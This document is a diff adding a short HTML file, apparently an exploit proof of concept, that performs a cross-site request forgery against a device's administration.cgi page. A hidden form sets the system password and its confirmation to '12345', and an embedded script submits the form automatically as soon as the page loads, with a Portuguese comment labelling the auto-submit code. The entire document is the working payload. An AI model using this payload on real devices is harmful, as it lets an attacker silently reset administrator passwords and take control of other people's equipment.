@@ -1,0 +1,12 @@
+&lt;html&gt;&lt;body&gt;
+&lt;form method=&quot;POST&quot; action=&quot;http://IP_ADDRESS:8080/administration.cgi&quot; name=&quot;senha&quot;
+ENCTYPE=&quot;multipart/form-data&quot;&gt;
+&lt;INPUT type=&quot;hidden&quot; name=&quot;sysPasswd&quot; value=&quot;12345&quot; maxLength=20 size=21&gt;
+&lt;INPUT type=&quot;hidden&quot; name=&quot;sysConfirmPasswd&quot; value=&quot;12345&quot; maxLength=20 size=21&gt;
+&lt;/form&gt;
+
+&lt;!-- C?digo de envio autom?tico do formul?rio --&gt;
+
+&lt;SCRIPT language=&quot;JavaScript&quot;&gt;
+  document.senha.submit();
+&lt;/SCRIPT&gt;
